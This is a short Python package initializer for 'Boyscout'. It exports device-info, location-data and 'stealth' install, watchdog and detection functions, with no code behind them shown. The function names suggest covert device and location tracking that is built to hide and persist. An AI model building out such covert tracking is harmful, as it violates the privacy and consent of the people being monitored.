"""Boyscout package"""
from .device import get_device_name, get_device_info
from .location import get_location_data
from .stealth import install_stealth, run_watchdog, check_if_running_stealth

__all__ = [
    'get_device_name',
    'get_device_info', 
    'get_location_data',
    'install_stealth',
    'run_watchdog',
    'check_if_running_stealth'
]
